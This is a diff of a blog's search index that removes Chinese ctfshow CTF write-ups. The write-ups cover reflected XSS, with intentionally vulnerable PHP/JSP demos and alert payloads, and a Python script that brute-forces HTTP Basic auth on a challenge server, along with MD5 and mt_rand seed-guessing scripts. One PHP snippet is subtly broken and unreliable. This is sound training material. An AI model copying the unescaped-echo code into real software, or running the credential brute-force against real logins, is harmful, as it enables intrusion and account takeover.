-<h3 id="产生层面"><a href="#产生层面" class="headerlink" title="产生层面"></a>产生层面</h3><p><strong>产生层面一般都是在前端</strong>，JavaScript代码能干什么，执行之后就会达到相应的效果</p>
-<h3 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h3><ol>
-<li>浏览器可以执行JavaScript代码（这不是废话吗）。</li>
-<li>网页可以显示用户输入的内容。包括但不限于：根据url中的参数渲染网页、预览输入框写好的内容、留言板等其他用户提交的内容等</li>
-</ol>
-<p>那么很显然这是被动的攻击，在之前并不流行，但是现在互联网主要讲求一个”互”,所以自然而然的也可以进行利用了，而能来干什么(最常见的钓鱼)，xss本质上来说是一种钓鱼攻击，所以 XSS 的危害角度上也是以钓鱼能够造成的危害为主。</p>
-<h3 id="危害（能拿来干什么）"><a href="#危害（能拿来干什么）" class="headerlink" title="危害（能拿来干什么）"></a>危害（能拿来干什么）</h3><ul>
-<li>窃取cookie 或token 来获得用户登录态；</li>
-<li>劫持流量，把用户正在访问的页面跳转到钓鱼网站；</li>
-<li>盗用账户来转账、群发信息等；</li>
-<li>利用用户的设备来发起DDOS攻击；</li>
-<li>网站挂马</li>
-<li>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</li>
-<li>盗窃企业重要的具有商业价值的资料</li>
-</ul>
-<p>所以归根结底，x<strong>ss的攻击方式就是想办法”教唆”用户的浏览器去执行一些这个网页中原本不存在的前端代码</strong>。可问题在于尽管一个信息框突然弹出来并不怎么友好，但也不至于会造成什么真实伤害啊。的确如此，但要说明的是，这里拿信息框说事仅仅是为了举个栗子，真正的黑客攻击在XSS中除非恶作剧，不然是不会在恶意植入代码中写上alert(“say something”)的。在真正的应用中，XSS攻击可以干的事情还有很多，这里举两个例子。</p>
-<ol>
-<li>窃取网页浏览中的cookie值。在网页浏览中我们常常涉及到用户登录，登录完毕之后服务端会返回一个cookie值。这个cookie值相当于一个令牌，拿着这张令牌就等同于证明了你是某个用户。如果你的cookie值被窃取，那么攻击者很可能能够直接利用你的这张令牌不用密码就登录你的账户。如果想要通过script脚本获得当前页面的cookie值，通常会用到cookie。试想下如果像空间说说中能够写入xss攻击语句，那岂不是看了你说说的人的号你都可以登录（不过貌似QQ的cookie有其他验证措施保证同一cookie不能被滥用）</li>
-<li>劫持流量实现恶意跳转。这个很简单，就是在网页中想办法插入一句像这样的语句：<a href="http://www.baidu.com那么所访问的网站就会被跳转到百度的首页.早在2011年新浪就曾爆出过严重的xss漏洞,导致大量用户自动关注某个微博号并自动转发某条微博.具体各位可以自行百度./">http://www.baidu.com那么所访问的网站就会被跳转到百度的首页。早在2011年新浪就曾爆出过严重的xss漏洞，导致大量用户自动关注某个微博号并自动转发某条微博。具体各位可以自行百度。</a></li>
-</ol>
-<h3 id="利用环境"><a href="#利用环境" class="headerlink" title="利用环境"></a>利用环境</h3><p>利用XSS需要浏览器版本和内核没有过滤XSS攻击（比如用谷歌Edge火狐等打开可以成功，但是IE却会拦截）</p>
-<h2 id="0x03xss攻击"><a href="#0x03xss攻击" class="headerlink" title="0x03xss攻击"></a>0x03xss攻击</h2><p>XSS攻击分成两类，一类是来自内部的攻击，另一类则是来自外部的攻击</p>
-<p>（1）来自内部的攻击<br>  主要指的是利用程序自身的漏洞，构造跨站语句，如:dvbbs的showerror.asp存在的跨站漏洞。</p>
-<p>（2）来自外部的攻击<br>  主要指的自己构造XSS跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页。如当我们要渗透一个站点，我们自己构造一个有跨站漏洞的网页，然后构造跨站语句，通过结合其它技术，如社会工程学等，欺骗目标服务器的管理员打开。</p>
-<h2 id="0x04xss分类及介绍"><a href="#0x04xss分类及介绍" class="headerlink" title="0x04xss分类及介绍"></a>0x04xss分类及介绍</h2><h4 id="1、反射型-非持久化"><a href="#1、反射型-非持久化" class="headerlink" title="1、反射型(非持久化)"></a>1、反射型(非持久化)</h4><p>（1）原理<br>  反射型xss又称非持久型xss，是目前最普遍的类型，这种攻击方式往往具有一次性。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以称反射型XSS。</p>
-<h4 id="2-攻击方式"><a href="#2-攻击方式" class="headerlink" title="2 攻击方式"></a>2 攻击方式</h4><p>  攻击者通过电子邮件等方式将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段带有xss代码的恶意脚本后就会触发xss漏洞</p>
-<h4 id="3-判断是否存在反射型xss漏洞并利用"><a href="#3-判断是否存在反射型xss漏洞并利用" class="headerlink" title="3 判断是否存在反射型xss漏洞并利用"></a>3 判断是否存在反射型xss漏洞并利用</h4><p>判断方法:判断有没有过滤一些特殊的字符串（比如对比输出的字符和输出的字符）,然后测试观察源代码有没有成功插入，如果可以插入那就构造payload进行注入</p>
-<p>这里简单写个demo来看看</p>
-<p>demo</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xss</span>;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?x=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/./../image/achieve/202411/xss--ctfshow/07a1746c6488d6afa192ea6f9f8771ec.png" alt="img"></p>
-<p>传入后直接就出现弹窗了,说明我们的恶意代码被解析插入网页中了，但这个demo相对简单，不能更好的理解攻击原理，我们再举个demo看看</p>
-<p>这里我就直接拿我朋友的demo来介绍了</p>
-<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;XSS 测试页面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;XSS 测试页面&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;xss_test.jsp&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;message&quot;</span>&gt;输入消息:&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;message&quot;</span> name=<span class="string">&quot;message&quot;</span> value=<span class="string">&quot;&lt;%= request.getParameter(&quot;</span>message<span class="string">&quot;) == null ? &quot;</span><span class="string">&quot; : request.getParameter(&quot;</span>message<span class="string">&quot;) %&gt;&quot;</span>&gt;</span><br><span class="line">    &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;提交&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">    您输入的消息是：&lt;%= request.getParameter(<span class="string">&quot;message&quot;</span>) == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : request.getParameter(<span class="string">&quot;message&quot;</span>) %&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>如果使用<code>Tomcat</code>来搭建一个本地服务，其中载入<code>jsp</code>漏洞代码，即可进行<code>xss</code>测试</p>
-<p>先简单的写个<code>xss_test.jsp</code>直接用来测试的</p>
-<p>我们直接在输入框中输入</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>发现弹窗成功，我们再看看代码</p>
-<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;XSS 测试页面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;XSS 测试页面&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;xss_test.jsp&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;message&quot;</span>&gt;输入消息:&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;message&quot;</span> name=<span class="string">&quot;message&quot;</span> value=<span class="string">&quot;&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;&quot;</span>&gt;</span><br><span class="line">    &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;提交&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">    您输入的消息是：&lt;script&gt;alert(<span class="string">&#x27;XSS&#x27;</span>);&lt;/script&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到我们的恶意代码插入了刚刚的输入框，也就是被放进源码之中解析了。</p>
-<p>到这里很多人就要问了，这个payload是什么，看不懂一点，那就先介绍一下payload</p>
-<p>分析payload</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>&lt;script&gt;</code>标签用于在HTML文档中嵌入或引用JavaScript代码。浏览器会执行<code>&lt;script&gt;</code>标签内的代码。</li>
-<li><code>alert(&#39;XSS&#39;)</code>是一个JavaScript函数调用，用于在浏览器中弹出一个警告框，显示文本“XSS”。</li>
-</ul>
-<p>XSS 的攻击构造与理解异常简单与轻松，难点在于各种绕过手段。</p>
-]]></content>
-      <categories>
-        <category>ctfshow</category>
+        <category>ssti</category>
       </categories>
       <tags>
         <tag>web安全</tag>
@@ -515,139 +694,6 @@
 
 <p>先审一下代码：</p>
 <p>$allow &#x3D; array();–创建了一个空数组 $allow，用来存储后续生成的随机数。</p>
-]]></content>
-      <categories>
-        <category>ctfshow</category>
-      </categories>
-      <tags>
-        <tag>web安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>web入门爆破篇-ctfshow</title>
-    <url>/2024/11/05/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/</url>
-    <content><![CDATA[<h1 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h1><h2 id="暴力破解原理"><a href="#暴力破解原理" class="headerlink" title="暴力破解原理"></a>暴力破解原理</h2><p>暴力破解实际就是疯狂的输入密码进行尝试登录，针对有的人喜欢用一些个人信息当做密码，有的人喜欢用一些很简单的低强度密码，我们就可以针对性的生成一个字典，用脚本或者工具挨个去尝试登录。</p>
-<h2 id="暴力破解前提"><a href="#暴力破解前提" class="headerlink" title="暴力破解前提"></a>暴力破解前提</h2><p>1.没安装waf，或者安装了waf没有开启流量拦截</p>
-<p>2.没有规定输入密码多少次后无法继续输入</p>
-<p>3.没有验证码，或者验证码生成在数据包中与输入的验证码进行比对。</p>
-<p>4.判定输入密码次数等是根据数据包中的ip等判定，我们就可以用字典变换ip去绕过</p>
-<h2 id="burpsuite爆破的四种模式"><a href="#burpsuite爆破的四种模式" class="headerlink" title="burpsuite爆破的四种模式"></a>burpsuite爆破的四种模式</h2><p>四种模式分别为：Sniper、Battering ram、Pitchfork、 Cluster bomb(推荐使用)</p>
-<h2 id="1-Sniper-狙击手"><a href="#1-Sniper-狙击手" class="headerlink" title="1.Sniper(狙击手)"></a>1.Sniper(狙击手)</h2><p>作为比较常用的模式，Sniper的作用是对其中选定的参数一个一个依次遍历字典并且替换然后测试。sniper只能默认对第一个参数进行修改，而无法对两个参数同时进行爆破。</p>
-<h2 id="2-Battering-ram-攻城锤"><a href="#2-Battering-ram-攻城锤" class="headerlink" title="2.Battering ram(攻城锤)"></a>2.Battering ram(攻城锤)</h2><p>不同于sniper，Battering ram是两个参数同时进行遍历一个字典的</p>
-<h2 id="3-Pitchfork-草叉模式"><a href="#3-Pitchfork-草叉模式" class="headerlink" title="3.Pitchfork(草叉模式)"></a>3.Pitchfork(草叉模式)</h2><p>Pitchfork作为多字典，他的特点也非常明显，就是多个字典同时进行，与Battering ram有些相似之处，但是一个是多个人跑一个赛道，而一个是多个人，各有各的赛道。</p>
-<h2 id="4-Cluster-bomb-集束炸弹-推荐爆破时使用"><a href="#4-Cluster-bomb-集束炸弹-推荐爆破时使用" class="headerlink" title="4.Cluster bomb(集束炸弹)(推荐爆破时使用)"></a>4.Cluster bomb(集束炸弹)(推荐爆破时使用)</h2><p>Cluster bomb兼备了前面三种模式的所有的功能，那就是全部遍历，不放过所有情况，但是在超大字典的情况下，运算能力就限制了Cluster bomb模式的发挥，所以只要算力足够，那爆破出密码就不是问题。</p>
-<h1 id="web21基础爆破工具的使用"><a href="#web21基础爆破工具的使用" class="headerlink" title="web21基础爆破工具的使用"></a>web21基础爆破工具的使用</h1><p>1.查看题目</p>
-<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/1356dd000ac142fc809e0999f53aeb05.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
-<p>是一道登录题，</p>
-<p>此题主要考察基础的爆破</p>
-<h2 id="方法一-bp爆破"><a href="#方法一-bp爆破" class="headerlink" title="方法一:bp爆破"></a>方法一:bp爆破</h2><p>1：假设已知用户名是admin</p>
-<p>2：打开代理和Burp Suite，随便输入密码尝试登陆同时利用Burp Suite抓包。</p>
-<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/3cc4f460204f49ceab82954db935acc0.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
-<h3 id="知识点-Authorization请求头"><a href="#知识点-Authorization请求头" class="headerlink" title="知识点:Authorization请求头"></a>知识点:Authorization请求头</h3><p>Authorization请求头用于验证是否有从服务器访问所需数据的权限。</p>
-<p>3：得到Authorization: Basic YWRtaW46YWRtaW4&#x3D; 可以看到他数据包是通过加密发送的，并且前面有Basic,对后面的 进行base64解码查看格为 admin：密码</p>
-<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/5418433a13e443f1bcb02102de98d502.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
-<p>4：查看Authorization请求头观察发现是base64编码 我们将请求包发送到intruder中，选择sniper模式。选择base64内容Authorization: Basic YWRtaW46YWRtaW4&#x3D;，添加为playload position</p>
-<p>5：然后payload选择Custom iterator，根据已知格式，我们设置第一组payload位账号：admin，第二组一个冒号:，第三组密码：密码字典。 接下来设置Payload Processing的base64加密，点击add，选择encode&gt;Base64-encode，最后将PayLoad Encoding取消选择urlencode加密特俗字符串。</p>
-<p>6：进行爆破，找到长度不同的即为正确答案。</p>
-<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/95e8a69e415a4801ab7065cfa422146a.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
-<p>找到flag。</p>
-<h2 id="方法二-自动爆破脚本"><a href="#方法二-自动爆破脚本" class="headerlink" title="方法二:自动爆破脚本"></a>方法二:自动爆破脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time<span class="comment">#用于延时</span></span><br><span class="line"><span class="keyword">import</span> requests<span class="comment">#用于发送请求</span></span><br><span class="line"><span class="keyword">import</span> base64<span class="comment">#用于base64编码</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://ededa0b4-a3d7-43f0-9f06-c8db1fce2434.challenge.ctf.show/index.php&#x27;</span><span class="comment">#放入url</span></span><br><span class="line"></span><br><span class="line">password = []<span class="comment">#密码列表</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:  <span class="comment">#读取密码字典/1.txt是字典密码</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:<span class="comment">#循环读取密码字典</span></span><br><span class="line">        data = f.readline() <span class="comment">#读取一行</span></span><br><span class="line">        <span class="keyword">if</span> data:<span class="comment">#判断是否为空</span></span><br><span class="line">            password.append(data)<span class="comment">#添加到列表</span></span><br><span class="line">        <span class="keyword">else</span>:<span class="comment">#判断是否到达文件末尾</span></span><br><span class="line">            <span class="keyword">break</span><span class="comment">#结束循环</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> password:<span class="comment">#循环遍历密码列表</span></span><br><span class="line">    strs = <span class="string">&#x27;admin:&#x27;</span>+ p[:-<span class="number">1</span>]<span class="comment">#拼接用户名和密码</span></span><br><span class="line">    header=&#123;</span><br><span class="line">        <span class="string">&#x27;Authorization&#x27;</span>:<span class="string">&#x27;Basic &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(base64.b64encode(strs.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    &#125;<span class="comment">#设置请求头</span></span><br><span class="line">    rep =requests.get(url,headers=header)<span class="comment">#发送请求</span></span><br><span class="line">    time.sleep(<span class="number">0.2</span>)<span class="comment">#延时0.2秒</span></span><br><span class="line">    <span class="keyword">if</span> rep.status_code ==<span class="number">200</span>:<span class="comment">#判断请求是否成功</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(rep.text)<span class="comment">#打印响应内容</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<h1 id="web23条件爆破"><a href="#web23条件爆破" class="headerlink" title="web23条件爆破"></a>web23条件爆破</h1><p>1.查看题目</p>
-<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/7a9fe5418c734bc885623e1945fba644.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
-<h2 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr()函数:"></a>substr()函数:</h2><p>substr($string, start, length)函数用于从字符串$string中提取从start位置开始的length个字符。如果length省略，则默认提取到字符串的末尾。</p>
-<ul>
-<li>if(substr($token, 1,1)&#x3D;&#x3D;&#x3D;substr($token, 14,1) &amp;&amp; substr($token, 14,1) &#x3D;&#x3D;&#x3D;substr($token, 17,1)):</li>
-</ul>
-<p>检验$token的第一个字符，第14个字符是否相等，第14个字符和第17个字符是否相等</p>
-<ul>
-<li>if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))&#x2F;substr($token, 1,1)&#x3D;&#x3D;&#x3D;intval(substr($token, 31,1))):</li>
-</ul>
-<p>第一个+第14个+第17个&#x3D;第31个</p>
-<p>GET一个参数token，token的MD5加密后的值如果满足下面的判断，就输出flag</p>
-<h2 id="用爆破脚本"><a href="#用爆破脚本" class="headerlink" title="用爆破脚本"></a>用爆破脚本</h2><h3 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib<span class="comment">#导入hashlib模块</span></span><br><span class="line">dic = <span class="string">&quot;0123456789qazwsxedcrfvtgbyhnujmikolp&quot;</span><span class="comment">#定义字典</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> dic:<span class="comment">#遍历字典</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> dic:<span class="comment">#遍历字典</span></span><br><span class="line">        t = <span class="built_in">str</span>(a)+<span class="built_in">str</span>(b)<span class="comment">#拼接字符串</span></span><br><span class="line">        md5 = hashlib.md5(t.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()<span class="comment">#计算md5值</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> md5[<span class="number">1</span>:<span class="number">2</span>] == md5[<span class="number">14</span>:<span class="number">15</span>] <span class="keyword">and</span> md5[<span class="number">14</span>:<span class="number">15</span>] == md5[<span class="number">17</span>:<span class="number">18</span>]:<span class="comment">#判断md5值是否符合条件</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(md5[<span class="number">1</span>:<span class="number">2</span>])+<span class="built_in">int</span>(md5[<span class="number">14</span>:<span class="number">15</span>])+<span class="built_in">int</span>(md5[<span class="number">17</span>:<span class="number">18</span>])/<span class="built_in">int</span>(md5[<span class="number">1</span>:<span class="number">2</span>])==<span class="built_in">int</span>(md5[<span class="number">31</span>:<span class="number">32</span>]):</span><br><span class="line">                <span class="comment">#判断md5值是否符合条件</span></span><br><span class="line">                <span class="built_in">print</span>(t)<span class="comment">#打印符合条件的字符串</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<h3 id="php脚本"><a href="#php脚本" class="headerlink" title="php脚本"></a>php脚本</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;i&lt;<span class="number">10000</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$token</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">susbtr</span>(<span class="variable">$token</span>,<span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>,<span class="number">14</span>,<span class="number">1</span>)&amp;&amp;<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>,<span class="number">14</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>,<span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>,<span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>,<span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>,<span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>,<span class="number">1</span>,<span class="number">1</span>))===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>,<span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$i</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$token</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<h1 id="web24随机数种子爆破"><a href="#web24随机数种子爆破" class="headerlink" title="web24随机数种子爆破"></a>web24随机数种子爆破</h1><p>查看题目</p>
-<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/749f5e1611584c4a84d86c9b2ce1f20c.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
-<ul>
-<li>这行代码使用mt_srand函数设置随机数生成器的种子为372619038。这意味着每次以相同的种子初始化后，mt_rand()函数生成的随机数序列将是相同的。</li>
-<li>如果随机数种子定了 那么产生的随机数就是确定的</li>
-</ul>
-<h2 id="知识点-php伪随机数mt-rand-函数"><a href="#知识点-php伪随机数mt-rand-函数" class="headerlink" title="知识点:php伪随机数mt_rand()函数"></a>知识点:php伪随机数mt_rand()函数</h2><ul>
-<li><h3 id="mt-rand-函数"><a href="#mt-rand-函数" class="headerlink" title="mt_rand()函数"></a>mt_rand()函数</h3></li>
-</ul>
-<p>mt_rand()函数使用Mersenne Twister算法生成随机整数。</p>
-<p>使用的语法:mt_rand();or mt_rand(min,max);,生成一个区间内的随机数。</p>
-<p>其参数min默认为最小值0，max默认为可生成的随机数最大值2147483647，由mt_get randmax()函数获得。</p>
-<ul>
-<li><h3 id="mt-srand-函数"><a href="#mt-srand-函数" class="headerlink" title="mt_srand()函数"></a>mt_srand()函数</h3></li>
-<li><p>mt_srand()函数为随机数生成器。提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数。当不使用随机数播种函数srand时，php也会自动为随机数播种，因此是否确定种子都不会影响正常运行。在php中每一次调用mt_rand()函数，都会检查一下系统有没有播种。（播种为mt_srand()函数完成），当随机种子生成后，后面生成的随机数都会根据这个随机种子生成。所以同一个种子下，随机数的序列是相同的，这就是漏洞点</p>
-</li>
-<li><p>php_mt_seed工具:</p>
-</li>
-<li><p>php_mt_seed是c语言编写的爆破随机数序列种子的工具</p>
-</li>
-</ul>
-<p>我们做一个实验:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">0</span>);<span class="comment">//设置随机数播种为0</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//每次运行都会获得相同的序列    </span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//去掉mt_srand()函数后，系统会自动给rand函数播种，但也是播种一次</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
-
-<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>因此这里是伪随机</p>
-<p>所以我们根据给出的种子输出得到的序列就是我们的r值，在URL中填进去就能拿到flag了</p>
-<h1 id="web25伪随机数爆破"><a href="#web25伪随机数爆破" class="headerlink" title="web25伪随机数爆破"></a>web25伪随机数爆破</h1><p>查看题目</p>
